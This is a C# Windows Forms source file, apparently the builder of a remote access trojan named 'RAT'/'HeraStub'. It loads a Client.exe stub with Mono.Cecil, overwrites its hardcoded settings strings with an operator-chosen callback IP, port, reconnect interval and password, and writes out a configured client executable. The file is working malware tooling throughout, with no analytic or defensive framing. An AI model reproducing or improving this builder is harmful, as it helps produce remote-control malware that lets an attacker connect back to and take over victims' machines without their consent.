using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using Mono;
using Mono.Cecil;

namespace RAT
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBox3.Text == "")
                {
                    textBox3.Text = "DefaultPassword123";
                }
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.Title = "Save client as...";
                    sfd.RestoreDirectory = true;
                    sfd.InitialDirectory = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    sfd.Filter = "Executable Files (*.exe)|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        //Build using Mono.Cecil
                        try
                        {
                            textBox1.Text = "Reading Assembly...";
                            AssemblyDefinition ClientBuild = AssemblyDefinition.ReadAssembly("Client.exe");
                            textBox1.Text = textBox1.Text + "Done!" + Environment.NewLine;
                            foreach (var typeDef in ClientBuild.Modules[0].Types)
                            {
                                if (typeDef.FullName == "HeraStub.Settings")
                                {
                                    foreach (var methodDef in typeDef.Methods)
                                    {
                                        if (methodDef.Name == ".cctor")
                                        {
                                            int strings = 1;

                                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                                            {
                                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr")
                                                {
                                                    switch (strings)
                                                    {
                                                        case 1:
                                                            textBox1.Text = textBox1.Text + "Writing IP Address...";
                                                            methodDef.Body.Instructions[i].Operand = textBox2.Text;
                                                            textBox1.Text = textBox1.Text + "Done!" + Environment.NewLine;
                                                            break;
                                                        case 2:
                                                            textBox1.Text = textBox1.Text + "Writing Port...";
                                                            methodDef.Body.Instructions[i].Operand = ((int)numericUpDown1.Value).ToString();
                                                            textBox1.Text = textBox1.Text + "Done!" + Environment.NewLine;
                                                            break;
                                                        case 3:
                                                            textBox1.Text = textBox1.Text + "Writing Reconnect time...";
                                                            methodDef.Body.Instructions[i].Operand = ((int)numericUpDown2.Value).ToString();
                                                            textBox1.Text = textBox1.Text + "Done!" + Environment.NewLine;
                                                            break;
                                                        case 4:
                                                            textBox1.Text = textBox1.Text + "Writing Password...";
                                                            methodDef.Body.Instructions[i].Operand = textBox3.Text;
                                                            textBox1.Text = textBox1.Text + "Done!" + Environment.NewLine;
                                                            break;
                                                    }
                                                    strings++;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            textBox1.Text = textBox1.Text + "Writing Client Application...";
                            ClientBuild.Write(sfd.FileName);
                            textBox1.Text = textBox1.Text + "Done!";
                        }
                        catch (Exception ex)
                        {
                            textBox1.Text = textBox1.Text + "Error!";
                        }
                    }
                }
            }
            catch
            {
                MessageBox.Show("An Unknown Error Occured!", "Error!");
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {

        }
    }
}
